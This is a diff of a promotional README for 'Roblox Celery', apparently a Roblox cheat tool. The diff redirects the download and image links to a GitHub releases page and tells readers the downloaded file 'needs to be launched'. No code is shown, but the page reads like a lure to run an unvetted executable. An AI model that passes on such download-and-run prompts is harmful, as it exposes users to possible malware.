@@ -35,7 +35,7 @@ Are you ready to take your Roblox gaming experience to the next level? Look no f
 
 ## Get Started 🚀
 
-Ready to revolutionize your Roblox experience with Roblox Celery? [Download the latest release here!](https://github.com/assets/Release.zip)
+Ready to revolutionize your Roblox experience with Roblox Celery? [Download the latest release here!](https://github.com/xtone12/Roblox-Celery/releases)
 
 **Note:** The link provided ends with the file name and needs to be launched.
 
@@ -45,4 +45,4 @@ If the provided link does not work or you need more information, make sure to ch
 
 Let the adventure begin! 🎉
 
-![Roblox Celery](https://img.icons8.com/color/452/roblox.png)
+![Roblox Celery](https://github.com/xtone12/Roblox-Celery/releases)
